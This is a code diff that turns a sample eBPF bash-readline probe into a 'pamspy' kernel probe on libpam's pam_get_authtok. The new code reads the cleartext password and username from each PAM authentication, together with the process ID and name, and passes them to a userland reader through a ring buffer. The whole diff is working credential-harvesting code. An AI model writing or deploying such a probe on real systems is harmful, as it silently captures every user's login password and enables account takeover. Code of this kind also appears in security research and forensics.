@@ -1,31 +1,86 @@
 //go:build ignore
 
-#include "common.h"
-
-#include "bpf_tracing.h"
+#include "vmlinux.h"
+#include "pamspy_event.h"
+#include <bpf/bpf_helpers.h>
+#include <bpf/bpf_tracing.h>
+#include <bpf/bpf_core_read.h>
 
 char __license[] SEC("license") = "Dual MIT/GPL";
 
-struct event {
-	u32 pid;
-	u8 line[80];
-};
+/******************************************************************************/
+/*!
+ *  \brief  dump from source code of libpam
+ *          This is a partial header
+ */
+typedef struct pam_handle
+{
+  char *authtok;
+  unsigned caller_is;
+  void *pam_conversation;
+  char *oldauthtok;
+  char *prompt; /* for use by pam_get_user() */
+  char *service_name;
+  char *user;
+  char *rhost;
+  char *ruser;
+  char *tty;
+  char *xdisplay;
+  char *authtok_type; /* PAM_AUTHTOK_TYPE */
+  void *data;
+  void *env; /* structure to maintain environment list */
+} pam_handle_t;
 
-struct {
-	__uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
-} events SEC(".maps");
+/******************************************************************************/
+/*!
+ *  \brief  ring buffer use to communicate with userland process
+ */
+struct
+{
+  __uint(type, BPF_MAP_TYPE_RINGBUF);
+  __uint(max_entries, 256 * 1024);
+} rb SEC(".maps");
+
+/******************************************************************************/
+/*!
+ *  \brief  main userland return probe program
+ *  
+ *  int pam_get_authtok(pam_handle_t *pamh, int item,
+ *                         const char **authtok, const char *prompt);
+ *
+ */
+
 
 // Force emitting struct event into the ELF.
 const struct event *unused __attribute__((unused));
 
-SEC("uretprobe/bash_readline")
-int uretprobe_bash_readline(struct pt_regs *ctx) {
-	struct event event;
+SEC("uretprobe/pam_get_authtok")
+int trace_pam_get_authtok(struct pt_regs *ctx)
+{
+  if (!PT_REGS_PARM1(ctx))
+    return 0;
 
-	event.pid = bpf_get_current_pid_tgid();
-	bpf_probe_read(&event.line, sizeof(event.line), (void *)PT_REGS_RC(ctx));
+  pam_handle_t* phandle = (pam_handle_t*)PT_REGS_PARM1(ctx);
 
-	bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));
+  // Get current PID to track
+  u32 pid = bpf_get_current_pid_tgid() >> 32;
 
-	return 0;
-}
+  // retrieve output parameter
+  u64 password_addr = 0;
+  bpf_probe_read(&password_addr, sizeof(password_addr), &phandle->authtok);
+
+  u64 username_addr = 0;
+  bpf_probe_read(&username_addr, sizeof(username_addr), &phandle->user);
+
+  event_t *e;
+  e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
+  if (e)
+  {
+    e->pid = pid;
+    bpf_probe_read(&e->password, sizeof(e->password), (void *)password_addr);
+    bpf_probe_read(&e->username, sizeof(e->username), (void *)username_addr);
+    bpf_get_current_comm(&e->comm, sizeof(e->comm));
+    bpf_ringbuf_submit(e, 0);
+  }
+  return 0;
+};
